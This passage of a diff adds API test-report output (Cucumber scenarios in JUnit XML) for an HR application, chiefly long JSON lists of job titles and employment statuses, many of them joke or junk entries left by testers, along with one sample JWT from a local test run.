+            "job": "COO"
+        },
+        {
+            "id": "522",
+            "job": "Hardware Developer"
+        },
+        {
+            "id": "523",
+            "job": "fine"
+        },
+        {
+            "id": "524",
+            "job": "SDET LEAD"
+        },
+        {
+            "id": "525",
+            "job": "sure"
+        },
+        {
+            "id": "526",
+            "job": "Brat"
+        },
+        {
+            "id": "527",
+            "job": "Bestest fren"
+        },
+        {
+            "id": "528",
+            "job": "Big Boss"
+        },
+        {
+            "id": "529",
+            "job": "kjhghhk"
+        },
+        {
+            "id": "530",
+            "job": "QA Director"
+        },
+        {
+            "id": "531",
+            "job": "shoeshinner"
+        },
+        {
+            "id": "532",
+            "job": "devop"
+        },
+        {
+            "id": "533",
+            "job": "FOOTBALLER"
+        },
+        {
+            "id": "534",
+            "job": "QA Master"
+        },
+        {
+            "id": "535",
+            "job": "automatoin"
+        },
+        {
+            "id": "536",
+            "job": "ISSIZ"
+        },
+        {
+            "id": "537",
+            "job": "Check mep_status"
+        },
+        {
+            "id": "538",
+            "job": "Check emp_status"
+        },
+        {
+            "id": "539",
+            "job": "Drug Dealer"
+        },
+        {
+            "id": "540",
+            "job": "PUBG-BOSS"
+        },
+        {
+            "id": "541",
+            "job": "Thebartender"
+        },
+        {
+            "id": "542",
+            "job": "Kosa"
+        },
+        {
+            "id": "543",
+            "job": "strdfdsng"
+        },
+        {
+            "id": "544",
+            "job": "unemployeed"
+        },
+        {
+            "id": "545",
+            "job": "Web Developer"
+        },
+        {
+            "id": "546",
+            "job": "Web Designer"
+        },
+        {
+            "id": "547",
+            "job": "CE"
+        },
+        {
+            "id": "548",
+            "job": "Soon"
+        },
+        {
+            "id": "549",
+            "job": "mecanografoSenior"
+        },
+        {
+            "id": "550",
+            "job": "Sipsdhon"
+        },
+        {
+            "id": "551",
+            "job": "Explorer"
+        },
+        {
+            "id": "552",
+            "job": "blbla"
+        },
+        {
+            "id": "553",
+            "job": "American actor"
+        },
+        {
+            "id": "554",
+            "job": "Space Pirate"
+        },
+        {
+            "id": "555",
+            "job": "explosive winger"
+        },
+        {
+            "id": "556",
+            "job": "IT AnalAnalytics"
+        },
+        {
+            "id": "557",
+            "job": "Disco Dancer"
+        },
+        {
+            "id": "558",
+            "job": "Pimp"
+        },
+        {
+            "id": "559",
+            "job": "Drink"
+        },
+        {
+            "id": "560",
+            "job": "Dodo Head"
+        },
+        {
+            "id": "561",
+            "job": "Thot"
+        },
+        {
+            "id": "562",
+            "job": "I got your girl in my focus"
+        },
+        {
+            "id": "563",
+            "job": "Chef"
+        },
+        {
+            "id": "564",
+            "job": "Performer"
+        },
+        {
+            "id": "565",
+            "job": "Crazy"
+        },
+        {
+            "id": "566",
+            "job": "Booty Shaker"
+        },
+        {
+            "id": "567",
+            "job": "Intoxicator"
+        },
+        {
+            "id": "568",
+            "job": "Influencer"
+        },
+        {
+            "id": "569",
+            "job": "Black Out"
+        },
+        {
+            "id": "570",
+            "job": "Party Hardy"
+        },
+        {
+            "id": "571",
+            "job": "Honey Magnet"
+        },
+        {
+            "id": "572",
+            "job": "Good Time"
+        },
+        {
+            "id": "573",
+            "job": "Baby Maker"
+        },
+        {
+            "id": "574",
+            "job": "Woman Lover"
+        },
+        {
+            "id": "575",
+            "job": "Chubby Butt"
+        },
+        {
+            "id": "576",
+            "job": "Tired"
+        },
+        {
+            "id": "577",
+            "job": "Racer"
+        },
+        {
+            "id": "578",
+            "job": "fired for speeding"
+        },
+        {
+            "id": "579",
+            "job": "Bully"
+        },
+        {
+            "id": "580",
+            "job": "QAEngineer"
+        },
+        {
+            "id": "581",
+            "job": "Vice President"
+        },
+        {
+            "id": "582",
+            "job": "Idiots"
+        },
+        {
+            "id": "583",
+            "job": "Stinky"
+        },
+        {
+            "id": "584",
+            "job": "Potions Teacher"
+        },
+        {
+            "id": "585",
+            "job": "Head Master"
+        },
+        {
+            "id": "586",
+            "job": "Minister of Magic"
+        },
+        {
+            "id": "587",
+            "job": "Professor: Care of Magical Creatures"
+        },
+        {
+            "id": "588",
+            "job": "High Inquisitor"
+        },
+        {
+            "id": "589",
+            "job": "Transfiguration Professor"
+        },
+        {
+            "id": "590",
+            "job": "Potions Professor"
+        },
+        {
+            "id": "591",
+            "job": "Death Eater"
+        },
+        {
+            "id": "592",
+            "job": "Inquisitorial Squad"
+        },
+        {
+            "id": "593",
+            "job": "Assistant to the Minister of Magic"
+        },
+        {
+            "id": "594",
+            "job": "Muggle"
+        },
+        {
+            "id": "595",
+            "job": "Evil Aunt"
+        },
+        {
+            "id": "596",
+            "job": "Tri-Wizard Tournament Champion"
+        },
+        {
+            "id": "597",
+            "job": "Witch"
+        },
+        {
+            "id": "598",
+            "job": "Protector of the Black Flamed Candle"
+        },
+        {
+            "id": "599",
+            "job": "ingredient"
+        },
+        {
+            "id": "600",
+            "job": "Actor, producer"
+        },
+        {
+            "id": "601",
+            "job": "legen"
+        },
+        {
+            "id": "602",
+            "job": "Nice friend"
+        },
+        {
+            "id": "603",
+            "job": "SoftManager"
+        },
+        {
+            "id": "604",
+            "job": "jonin"
+        },
+        {
+            "id": "605",
+            "job": "Playboy, Miilionaire, Philanthrapist"
+        },
+        {
+            "id": "606",
+            "job": "str"
+        },
+        {
+            "id": "607",
+            "job": "rainbow maker"
+        },
+        {
+            "id": "608",
+            "job": "Humanitarian"
+        },
+        {
+            "id": "609",
+            "job": "Distiller"
+        },
+        {
+            "id": "610",
+            "job": "Sa Led"
+        },
+        {
+            "id": "611",
+            "job": "Entertainer"
+        },
+        {
+            "id": "612",
+            "job": "QA President"
+        },
+        {
+            "id": "613",
+            "job": "QA Warrior"
+        },
+        {
+            "id": "614",
+            "job": "Weq"
+        },
+        {
+            "id": "615",
+            "job": "QA dog"
+        },
+        {
+            "id": "616",
+            "job": "Nakita"
+        },
+        {
+            "id": "617",
+            "job": "gop"
+        },
+        {
+            "id": "618",
+            "job": "QA-Automation"
+        },
+        {
+            "id": "619",
+            "job": "Fashion Designer"
+        },
+        {
+            "id": "620",
+            "job": "QA-LEAD"
+        },
+        {
+            "id": "621",
+            "job": "QA Supervisor"
+        },
+        {
+            "id": "622",
+            "job": "Sand Man"
+        },
+        {
+            "id": "623",
+            "job": "Casanova"
+        },
+        {
+            "id": "624",
+            "job": "Panty Dropper"
+        },
+        {
+            "id": "625",
+            "job": "Head QA Eng"
+        },
+        {
+            "id": "626",
+            "job": "Quality Assurance Technician"
+        },
+        {
+            "id": "627",
+            "job": "Quality Assurance Engineer"
+        },
+        {
+            "id": "628",
+            "job": "Non"
+        },
+        {
+            "id": "629",
+            "job": "QA cute"
+        },
+        {
+            "id": "630",
+            "job": "beacher"
+        },
+        {
+            "id": "631",
+            "job": "prensess"
+        },
+        {
+            "id": "632",
+            "job": "QA Automation Engineer"
+        },
+        {
+            "id": "633",
+            "job": "Automatin engineer"
+        },
+        {
+            "id": "634",
+            "job": "Khayamal"
+        },
+        {
+            "id": "635",
+            "job": "work"
+        },
+        {
+            "id": "636",
+            "job": "Camper"
+        },
+        {
+            "id": "637",
+            "job": "Record label owner"
+        },
+        {
+            "id": "638",
+            "job": "BA"
+        },
+        {
+            "id": "639",
+            "job": "ghjhj"
+        },
+        {
+            "id": "640",
+            "job": "Crane Operator"
+        },
+        {
+            "id": "641",
+            "job": "football player"
+        },
+        {
+            "id": "642",
+            "job": "QA Ebgineer"
+        },
+        {
+            "id": "643",
+            "job": "SDET Queen"
+        },
+        {
+            "id": "644",
+            "job": "Activist/Leader"
+        },
+        {
+            "id": "645",
+            "job": "QA enge"
+        },
+        {
+            "id": "646",
+            "job": "QA Analist"
+        },
+        {
+            "id": "647",
+            "job": "player"
+        },
+        {
+            "id": "648",
+            "job": "test"
+        },
+        {
+            "id": "649",
+            "job": "Autmomated Tester"
+        },
+        {
+            "id": "650",
+            "job": "uhqwsdk"
+        },
+        {
+            "id": "651",
+            "job": "Testing Consultant"
+        },
+        {
+            "id": "652",
+            "job": "SDET Trainee"
+        },
+        {
+            "id": "653",
+            "job": "It Technition"
+        },
+        {
+            "id": "654",
+            "job": "Fairy"
+        },
+        {
+            "id": "655",
+            "job": "SDET Princess"
+        },
+        {
+            "id": "656",
+            "job": "Terminator"
+        },
+        {
+            "id": "657",
+            "job": "math eng"
+        },
+        {
+            "id": "658",
+            "job": "Better Tester"
+        },
+        {
+            "id": "659",
+            "job": "Queen"
+        },
+        {
+            "id": "660",
+            "job": "Emgineer"
+        },
+        {
+            "id": "661",
+            "job": "QA Engineer manager"
+        },
+        {
+            "id": "662",
+            "job": "happiness giver"
+        },
+        {
+            "id": "663",
+            "job": "SDET Nerd"
+        },
+        {
+            "id": "664",
+            "job": "GEO"
+        },
+        {
+            "id": "665",
+            "job": "Kids leader"
+        },
+        {
+            "id": "666",
+            "job": "Superviser"
+        },
+        {
+            "id": "667",
+            "job": "Lead QA Engineer"
+        },
+        {
+            "id": "668",
+            "job": "clerk"
+        },
+        {
+            "id": "669",
+            "job": "manageer"
+        },
+        {
+            "id": "670",
+            "job": "team leader"
+        },
+        {
+            "id": "671",
+            "job": "ASST.Manager"
+        },
+        {
+            "id": "672",
+            "job": "Pro QA"
+        },
+        {
+            "id": "673",
+            "job": "Barista"
+        },
+        {
+            "id": "674",
+            "job": "GAMING MAN"
+        },
+        {
+            "id": "675",
+            "job": "Creater"
+        },
+        {
+            "id": "676",
+            "job": "N/A "
+        },
+        {
+            "id": "677",
+            "job": "Secret Agent (Spy)"
+        },
+        {
+            "id": "678",
+            "job": "presinent"
+        },
+        {
+            "id": "679",
+            "job": " Super Secret Agent (Spy)"
+        },
+        {
+            "id": "680",
+            "job": "Queen of the House"
+        },
+        {
+            "id": "681",
+            "job": "QA architect"
+        },
+        {
+            "id": "682",
+            "job": "Gangster"
+        },
+        {
+            "id": "683",
+            "job": "legend"
+        },
+        {
+            "id": "684",
+            "job": "Lead Software Developer"
+        },
+        {
+            "id": "685",
+            "job": "R&B Singer"
+        },
+        {
+            "id": "686",
+            "job": "Cloud engineer manager"
+        },
+        {
+            "id": "687",
+            "job": "Lead Tester"
+        },
+        {
+            "id": "688",
+            "job": "wedttfy"
+        },
+        {
+            "id": "689",
+            "job": "T"
+        },
+        {
+            "id": "690",
+            "job": " Super fast Secret Agent (Spy)"
+        },
+        {
+            "id": "691",
+            "job": "QW Eng"
+        },
+        {
+            "id": "692",
+            "job": "QA Analist Lead"
+        },
+        {
+            "id": "693",
+            "job": " ENG"
+        },
+        {
+            "id": "694",
+            "job": "Hero"
+        },
+        {
+            "id": "695",
+            "job": "BossStatus"
+        },
+        {
+            "id": "696",
+            "job": "vampire"
+        },
+        {
+            "id": "697",
+            "job": "Tester lead"
+        },
+        {
+            "id": "698",
+            "job": "Sr.Testing Consultant"
+        },
+        {
+            "id": "699",
+            "job": "Quality Tester"
+        },
+        {
+            "id": "700",
+            "job": "Big Brother"
+        },
+        {
+            "id": "701",
+            "job": "Housewife"
+        },
+        {
+            "id": "702",
+            "job": "House Keeper"
+        },
+        {
+            "id": "703",
+            "job": "QA Team Leader"
+        },
+        {
+            "id": "704",
+            "job": "Volunteer"
+        },
+        {
+            "id": "705",
+            "job": "AbcdeF"
+        },
+        {
+            "id": "706",
+            "job": "ORGANISOR"
+        },
+        {
+            "id": "707",
+            "job": "QA Specialist"
+        },
+        {
+            "id": "708",
+            "job": "lawyer"
+        },
+        {
+            "id": "709",
+            "job": "spy"
+        },
+        {
+            "id": "710",
+            "job": "Qa Automation"
+        },
+        {
+            "id": "711",
+            "job": "production"
+        },
+        {
+            "id": "712",
+            "job": "Stunt Man"
+        },
+        {
+            "id": "713",
+            "job": "PopStar"
+        },
+        {
+            "id": "714",
+            "job": "World Star"
+        },
+        {
+            "id": "715",
+            "job": " Mega Star"
+        },
+        {
+            "id": "716",
+            "job": "Cyber Analyst"
+        },
+        {
+            "id": "717",
+            "job": "Instructors"
+        },
+        {
+            "id": "718",
+            "job": "paleontologist"
+        },
+        {
+            "id": "719",
+            "job": "baker"
+        },
+        {
+            "id": "720",
+            "job": "Full Stack"
+        },
+        {
+            "id": "721",
+            "job": "AQ"
+        },
+        {
+            "id": "722",
+            "job": "Security officer"
+        },
+        {
+            "id": "723",
+            "job": "Barmen"
+        },
+        {
+            "id": "724",
+            "job": "Furniture reprocessor"
+        },
+        {
+            "id": "725",
+            "job": "QA team lead"
+        },
+        {
+            "id": "726",
+            "job": "postManHunter"
+        },
+        {
+            "id": "727",
+            "job": "Emperor"
+        },
+        {
+            "id": "728",
+            "job": "Lover"
+        },
+        {
+            "id": "729",
+            "job": "Account Manager"
+        },
+        {
+            "id": "730",
+            "job": "Account Manager II"
+        },
+        {
+            "id": "731",
+            "job": "star counter"
+        },
+        {
+            "id": "732",
+            "job": "Pastor"
+        },
+        {
+            "id": "733",
+            "job": "QA SDET"
+        },
+        {
+            "id": "734",
+            "job": "vendor"
+        },
+        {
+            "id": "735",
+            "job": "QA LeadV5"
+        },
+        {
+            "id": "736",
+            "job": "Politician"
+        },
+        {
+            "id": "737",
+            "job": "Microsoft CEO"
+        },
+        {
+            "id": "738",
+            "job": "comedian"
+        },
+        {
+            "id": "739",
+            "job": "Wife"
+        },
+        {
+            "id": "740",
+            "job": "Play"
+        },
+        {
+            "id": "741",
+            "job": "Quarterback"
+        },
+        {
+            "id": "742",
+            "job": "unem"
+        },
+        {
+            "id": "743",
+            "job": "noEmployee"
+        },
+        {
+            "id": "744",
+            "job": "No employement"
+        },
+        {
+            "id": "745",
+            "job": "buzyk"
+        },
+        {
+            "id": "746",
+            "job": "HomeMinister"
+        },
+        {
+            "id": "747",
+            "job": "SAH"
+        },
+        {
+            "id": "748",
+            "job": "noemploy"
+        },
+        {
+            "id": "749",
+            "job": "mahanayak"
+        },
+        {
+            "id": "750",
+            "job": "contract"
+        },
+        {
+            "id": "751",
+            "job": "Teller"
+        },
+        {
+            "id": "752",
+            "job": "undisclosed"
+        },
+        {
+            "id": "753",
+            "job": "SoccerPlayer"
+        },
+        {
+            "id": "754",
+            "job": "QA millioner "
+        },
+        {
+            "id": "755",
+            "job": "Capitan"
+        },
+        {
+            "id": "756",
+            "job": "Success/Fail"
+        },
+        {
+            "id": "757",
+            "job": "Unemploy"
+        },
+        {
+            "id": "758",
+            "job": "sexopatologist"
+        },
+        {
+            "id": "759",
+            "job": "homeless"
+        },
+        {
+            "id": "760",
+            "job": " qa "
+        },
+        {
+            "id": "761",
+            "job": "bossss"
+        },
+        {
+            "id": "762",
+            "job": "retired"
+        },
+        {
+            "id": "763",
+            "job": "bss"
+        },
+        {
+            "id": "764",
+            "job": "Hunter"
+        },
+        {
+            "id": "765",
+            "job": "Tupa"
+        },
+        {
+            "id": "766",
+            "job": "QA_Engineer"
+        },
+        {
+            "id": "767",
+            "job": "Jr_Engineer"
+        },
+        {
+            "id": "768",
+            "job": "Die Manager"
+        },
+        {
+            "id": "769",
+            "job": "Acountant"
+        },
+        {
+            "id": "770",
+            "job": "QA Babysitter"
+        },
+        {
+            "id": "771",
+            "job": "UI Developer"
+        },
+        {
+            "id": "772",
+            "job": "Preacher"
+        },
+        {
+            "id": "773",
+            "job": "Astronaut"
+        },
+        {
+            "id": "774",
+            "job": "Engineerrrr"
+        },
+        {
+            "id": "775",
+            "job": "SPYr"
+        },
+        {
+            "id": "776",
+            "job": "Testing manager"
+        },
+        {
+            "id": "777",
+            "job": "Teamlead"
+        }
+    ]
+}
+  And content type is present                 # APISteps.GetEmployeesJobTitles.content_type_is_present()
+]]></system-out>
+  </testcase>
+  <testcase name="api test to get all employee&apos; employment status" classname="API workflow test" time="0.354">
+    <system-out><![CDATA[
+@api
+Scenario: api test to get all employee' employment status # src/test/resources/features/APITesting.feature:42
+{
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzQ2OTk2OTUsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTY3NDc0Mjg5NSwidXNlcklkIjoiNTAzNiJ9.d1RjEkkWNMS6EvaDS43KLOi-63inXeBm0w54LnXfwNo"
+}
+  Given JWT is generated                                  # APISteps.GenerateTokenStep.jwt_is_generated()
+  Given request is prepared to get employment status      # APISteps.GetEmployeeEmploymentStatus.request_is_prepared_to_get_employment_status()
+  When get call is prepared                               # APISteps.GetEmployeeEmploymentStatus.get_call_is_prepared()
+  Then status code is 200                                 # APISteps.CreateNewEmployee.status_code_is(java.lang.Integer)
+  And object body contains "Employeement Status"          # APISteps.GetEmployeesJobTitles.object_body_contains(java.lang.String)
+{
+    "Employeement Status": [
+        {
+            "id": "4",
+            "name": "Independent contractor"
+        },
+        {
+            "id": "5",
+            "name": "Freelance"
+        },
+        {
+            "id": "6",
+            "name": "Zero hours contract"
+        },
+        {
+            "id": "10",
+            "name": "Part Time Employee"
+        },
+        {
+            "id": "11",
+            "name": "Seasonal Employee"
+        },
+        {
+            "id": "12",
+            "name": "Summer Time Employee"
+        },
+        {
+            "id": "17",
+            "name": "Active"
+        },
+        {
+            "id": "21",
+            "name": "Contract"
+        },
+        {
+            "id": "22",
+            "name": "Full time"
+        },
+        {
+            "id": "33",
+            "name": "Emplooyee"
+        },
+        {
+            "id": "37",
+            "name": "Self employement"
+        },
+        {
+            "id": "55",
+            "name": "Owner"
+        },
+        {
+            "id": "62",
+            "name": "Unenploiment"
+        },
+        {
+            "id": "65",
+            "name": "Employee"
+        },
+        {
+            "id": "66",
+            "name": "string"
+        },
+        {
+            "id": "67",
+            "name": "Self-Employee"
+        },
+        {
+            "id": "68",
+            "name": "awesome"
+        },
+        {
+            "id": "69",
+            "name": "employed"
+        },
+        {
+            "id": "70",
+            "name": "bcvb"
+        },
+        {
+            "id": "71",
+            "name": "worker"
+        },
+        {
+            "id": "72",
+            "name": "Life enjoyer"
+        },
+        {
+            "id": "73",
+            "name": "Stuck"
+        },
+        {
+            "id": "74",
+            "name": "active-active"
+        },
+        {
+            "id": "75",
+            "name": "Manager"
+        },
+        {
+            "id": "76",
+            "name": "Null"
+        },
+        {
+            "id": "77",
+            "name": "Emp"
+        },
+        {
+            "id": "78",
+            "name": "Cloud Architect"
+        },
+        {
+            "id": "79",
+            "name": "Gifter "
+        },
+        {
+            "id": "80",
+            "name": "Super Contractor"
+        },
+        {
+            "id": "81",
+            "name": "Created"
+        },
+        {
+            "id": "82",
+            "name": "{{empstatusFreelance}}"
+        },
+        {
+            "id": "84",
+            "name": "Employe"
+        },
+        {
+            "id": "85",
+            "name": "Emplyee"
+        },
+        {
+            "id": "86",
+            "name": "API Tester"
+        },
+        {
+            "id": "87",
+            "name": "Network Administrator"
+        },
+        {
+            "id": "88",
+            "name": "Database Administrator"
+        },
+        {
+            "id": "89",
+            "name": "CTO"
+        },
+        {
+            "id": "90",
+            "name": " "
+        },
+        {
+            "id": "91",
+            "name": "remote"
+        },
+        {
+            "id": "92",
+            "name": "INACTIVE"
+        },
+        {
+            "id": "93",
+            "name": "employeed"
+        },
+        {
+            "id": "94",
+            "name": "Employeed"
+        },
+        {
+            "id": "95",
+            "name": "Superstaaar"
+        },
+        {
+            "id": "96",
+            "name": "Scrum Master"
+        },
+        {
+            "id": "97",
+            "name": "unemployment"
+        },
+        {
+            "id": "98",
+            "name": "lay off"
+        },
+        {
+            "id": "99",
+            "name": "stremployee"
+        },
+        {
+            "id": "100",
+            "name": "BOSSMAN"
+        },
+        {
+            "id": "101",
+            "name": "Retired"
+        },
+        {
+            "id": "102",
+            "name": "UnEMPLOYEED"
+        },
+        {
+            "id": "103",
+            "name": "Searching"
+        },
+        {
+            "id": "104",
+            "name": "rich mofo"
+        },
+        {
+            "id": "105",
+            "name": "RIP"
+        },
+        {
+            "id": "106",
+            "name": "ODIN"
+        },
+        {
+            "id": "107",
+            "name": "EmployeeUpd"
+        },
+        {
+            "id": "108",
+            "name": "suspended"
+        },
+        {
+            "id": "109",
+            "name": "employeee"
+        },
+        {
+            "id": "110",
+            "name": "unEmployed"
+        },
+        {
+            "id": "111",
+            "name": "part-time"
+        },
+        {
+            "id": "112",
+            "name": "Doctor"
+        },
+        {
+            "id": "113",
+            "name": "Queen"
+        },
+        {
+            "id": "114",
+            "name": "FOREVA"
+        },
+        {
+            "id": "115",
+            "name": "FOREVEEA"
+        },
+        {
+            "id": "116",
+            "name": "FOR"
+        },
+        {
+            "id": "117",
+            "name": "Boss"
+        },
+        {
+            "id": "118",
+            "name": "QA"
+        },
+        {
+            "id": "119",
+            "name": "CEO"
+        },
+        {
+            "id": "120",
+            "name": "Consultant"
+        },
+        {
+            "id": "121",
+            "name": "BOSMAN"
+        },
+        {
+            "id": "122",
+            "name": "Engineer"
+        },
+        {
+            "id": "123",
+            "name": "Automation Tester"
+        },
+        {
+            "id": "124",
+            "name": "PoppyDoppy"
+        },
+        {
+            "id": "125",
+            "name": "employment"
+        },
+        {
+            "id": "126",
+            "name": "Employer"
+        },
+        {
+            "id": "127",
+            "name": "Kolpak"
+        },
+        {
+            "id": "128",
+            "name": "boss of the family"
+        },
+        {
+            "id": "129",
+            "name": "empl"
+        },
+        {
+            "id": "130",
+            "name": "laidOff"
+        },
+        {
+            "id": "131",
+            "name": "emplA"
+        },
+        {
+            "id": "132",
+            "name": "MULTIPLE"
+        },
+        {
+            "id": "133",
+            "name": "QAx"
+        },
+        {
+            "id": "134",
+            "name": "dEmployee"
+        },
+        {
+            "id": "135",
+            "name": "Employeue"
+        },
+        {
+            "id": "137",
+            "name": "emplye"
+        },
+        {
+            "id": "138",
+            "name": "Employeeed"
+        },
+        {
+            "id": "139",
+            "name": "Struggling"
+        },
+        {
+            "id": "140",
+            "name": "Independent contractors"
+        },
+        {
+            "id": "141",
+            "name": "Independent contractor 12345"
+        },
+        {
+            "id": "142",
+            "name": "Cool"
+        },
+        {
+            "id": "143",
+            "name": "none"
+        },
+        {
+            "id": "145",
+            "name": "Terminated"
+        },
+        {
+            "id": "146",
+            "name": "zubair"
+        },
+        {
+            "id": "147",
+            "name": "Developers"
+        },
+        {
+            "id": "148",
+            "name": "Application Developers"
+        },
+        {
+            "id": "149",
+            "name": "Probation"
+        },
+        {
+            "id": "150",
+            "name": "Tranining"
+        },
+        {
+            "id": "151",
+            "name": "Billionaire"
+        },
+        {
+            "id": "152",
+            "name": "Full"
+        },
+        {
+            "id": "153",
+            "name": "fulltime"
+        },
+        {
+            "id": "154",
+            "name": "propation"
+        },
+        {
+            "id": "155",
+            "name": "Legend"
+        },
+        {
+            "id": "156",
+            "name": "ENG"
+        },
+        {
+            "id": "157",
+            "name": "Pending"
+        },
+        {
+            "id": "158",
+            "name": "best"
+        },
+        {
+            "id": "159",
+            "name": "ProbationTestApi"
+        },
+        {
+            "id": "160",
+            "name": "Full-Time"
+        },
+        {
+            "id": "161",
+            "name": "dev"
+        },
+        {
+            "id": "162",
+            "name": "Regular"
+        },
+        {
+            "id": "163",
+            "name": "Divorce"
+        },
+        {
+            "id": "164",
+            "name": "NA"
+        },
+        {
+            "id": "165",
+            "name": "Fired"
+        },
+        {
+            "id": "166",
+            "name": "confirmed"
+        },
+        {
+            "id": "167",
+            "name": "confirm"
+        },
+        {
+            "id": "168",
+            "name": "cofirmed"
+        },
+        {
+            "id": "169",
+            "name": "Hero"
+        },
+        {
+            "id": "170",
+            "name": "LOE"
+        },
+        {
+            "id": "171",
+            "name": "hf"
+        },
+        {
+            "id": "172",
+            "name": "Coming"
+        },
+        {
+            "id": "173",
+            "name": "Cool Guy"
+        },
+        {
+            "id": "174",
+            "name": "On the Run"
+        },
+        {
+            "id": "175",
+            "name": "Comfirmed"
+        },
+        {
+            "id": "176",
+            "name": "sManager"
+        },
+        {
+            "id": "177",
+            "name": "Amele"
+        },
+        {
+            "id": "178",
+            "name": "Temporary"
+        },
+        {
+            "id": "179",
+            "name": "Not found"
+        },
+        {
+            "id": "180",
+            "name": "Active Duty"
+        },
+        {
+            "id": "181",
+            "name": "NOT ON PROBATION"
+        },
+        {
+            "id": "182",
+            "name": "shdq"
+        },
+        {
+            "id": "183",
+            "name": "Not on Provation"
+        },
+        {
+            "id": "184",
+            "name": "hired again"
+        },
+        {
+            "id": "185",
+            "name": "Online"
+        },
+        {
+            "id": "186",
+            "name": "No one knows"
+        },
+        {
+            "id": "187",
+            "name": "Hidden"
+        },
+        {
+            "id": "188",
+            "name": "promoted"
+        },
+        {
+            "id": "189",
+            "name": "Hired"
+        },
+        {
+            "id": "190",
+            "name": "not on a probation"
+        },
+        {
+            "id": "191",
+            "name": "Very Cool Guy"
+        },
+        {
+            "id": "192",
+            "name": "In process"
+        },
+        {
+            "id": "193",
+            "name": "not sure"
+        },
+        {
+            "id": "194",
+            "name": "Confirmed as partial update"
+        },
+        {
+            "id": "196",
+            "name": "non"
+        },
+        {
+            "id": "197",
+            "name": "Waiting "
+        },
+        {
+            "id": "198",
+            "name": "student"
+        },
+        {
+            "id": "199",
+            "name": "Single"
+        },
+        {
+            "id": "200",
+            "name": "SENIOR LEVEL 1"
+        },
+        {
+            "id": "201",
+            "name": "x"
+        },
+        {
+            "id": "202",
+            "name": "hfd"
+        },
+        {
+            "id": "203",
+            "name": "Trainee"
+        },
+        {
+            "id": "204",
+            "name": "Available"
+        },
+        {
+            "id": "205",
+            "name": "Alive"
+        },
+        {
+            "id": "206",
+            "name": "probition"
+        },
+        {
+            "id": "207",
+            "name": "Profession"
+        },
+        {
+            "id": "208",
+            "name": "Working"
+        },
+        {
+            "id": "209",
+            "name": "Permanent"
+        },
+        {
+            "id": "210",
+            "name": "software"
+        },
+        {
+            "id": "211",
+            "name": "probationperiod"
+        },
+        {
+            "id": "212",
+            "name": "busy"
+        },
+        {
+            "id": "213",
+            "name": "contractor"
+        },
+        {
+            "id": "214",
+            "name": "Unmarried"
+        },
+        {
+            "id": "215",
+            "name": "Halwai"
+        },
+        {
+            "id": "216",
+            "name": "will be upadted"
+        },
+        {
+            "id": "217",
+            "name": "fresher"
+        },
+        {
+            "id": "218",
+            "name": "train"
+        },
+        {
+            "id": "219",
+            "name": "Traniee"
+        },
+        {
+            "id": "220",
+            "name": "developer"
+        },
+        {
+            "id": "221",
+            "name": "will be Updated"
+        },
+        {
+            "id": "222",
+            "name": "escaper"
+        },
+        {
+            "id": "223",
+            "name": "Guest"
+        },
+        {
+            "id": "224",
+            "name": "senior"
+        },
+        {
+            "id": "225",
+            "name": "avalible"
+        },
+        {
+            "id": "226",
+            "name": "married"
+        },
+        {
+            "id": "227",
+            "name": "permanet"
+        },
+        {
+            "id": "228",
+            "name": "DEAD"
+        },
+        {
+            "id": "229",
+            "name": "imprisoned"
+        },
+        {
+            "id": "230",
+            "name": "QA Tester"
+        },
+        {
+            "id": "231",
+            "name": "not on probabtion"
+        },
+        {
+            "id": "232",
+            "name": "professional"
+        },
+        {
+            "id": "233",
+            "name": "Trainee7"
+        },
+        {
+            "id": "234",
+            "name": "not in probation"
+        },
+        {
+            "id": "235",
+            "name": "Lord of Fire"
+        },
+        {
+            "id": "236",
+            "name": "not Active"
+        },
+        {
+            "id": "237",
+            "name": "Notice"
+        },
+        {
+            "id": "238",
+            "name": "No on probation"
+        },
+        {
+            "id": "239",
+            "name": "Iron"
+        },
+        {
+            "id": "240",
+            "name": "On probation"
+        },
+        {
+            "id": "241",
+            "name": "non confirmed"
+        },
+        {
+            "id": "242",
+            "name": "notIron"
+        },
+        {
+            "id": "243",
+            "name": "Mare "
+        },
+        {
+            "id": "244",
+            "name": "hcsxd"
+        },
+        {
+            "id": "245",
+            "name": "QAr"
+        },
+        {
+            "id": "246",
+            "name": "Part Time"
+        },
+        {
+            "id": "247",
+            "name": "not probation"
+        },
+        {
+            "id": "248",
+            "name": "OFF"
+        },
+        {
+            "id": "249",
+            "name": "Comrade"
+        },
+        {
+            "id": "250",
+            "name": "On board"
+        },
+        {
+            "id": "251",
+            "name": "configure"
+        },
+        {
+            "id": "252",
+            "name": "SDET"
+        },
+        {
+            "id": "253",
+            "name": "jobless"
+        },
+        {
+            "id": "254",
+            "name": "Empllied"
+        },
+        {
+            "id": "255",
+            "name": "Driver"
+        },
+        {
+            "id": "256",
+            "name": "present"
+        },
+        {
+            "id": "257",
+            "name": "emoployed"
+        },
+        {
+            "id": "258",
+            "name": "confimed"
+        },
+        {
+            "id": "259",
+            "name": "LOA"
+        },
+        {
+            "id": "260",
+            "name": "teacher"
+        },
+        {
+            "id": "261",
+            "name": "temp"
+        },
+        {
+            "id": "262",
+            "name": "minion"
+        },
+        {
+            "id": "263",
+            "name": "New Emp"
+        },
+        {
+            "id": "264",
+            "name": "LazyStudent"
+        },
+        {
+            "id": "265",
+            "name": "unemployees"
+        },
+        {
+            "id": "266",
+            "name": "free"
+        },
+        {
+            "id": "267",
+            "name": "Independent contractor - Updated"
+        },
+        {
+            "id": "268",
+            "name": "Full-Time Employee"
+        },
+        {
+            "id": "269",
+            "name": "Umemployeed"
+        },
+        {
+            "id": "270",
+            "name": "Happy"
+        },
+        {
+            "id": "271",
+            "name": "fair"
+        },
+        {
+            "id": "272",
+            "name": "fat"
+        },
+        {
+            "id": "273",
+            "name": "lolo"
+        },
+        {
+            "id": "274",
+            "name": "qal"
+        },
+        {
+            "id": "275",
+            "name": "Updated: Independent contractor"
+        },
+        {
+            "id": "276",
+            "name": "You Got This"
+        },
+        {
+            "id": "277",
+            "name": "a"
+        },
+        {
+            "id": "279",
+            "name": "Urzalla"
+        },
+        {
+            "id": "280",
+            "name": "FTE"
+        },
+        {
+            "id": "281",
+            "name": "Bench"
+        },
+        {
+            "id": "282",
+            "name": "Enabled"
+        },
+        {
+            "id": "283",
+            "name": "Probabation"
+        },
+        {
+            "id": "284",
+            "name": "Permenent"
+        },
+        {
+            "id": "285",
+            "name": "New Hire"
+        },
+        {
+            "id": "286",
+            "name": "training"
+        },
+        {
+            "id": "287",
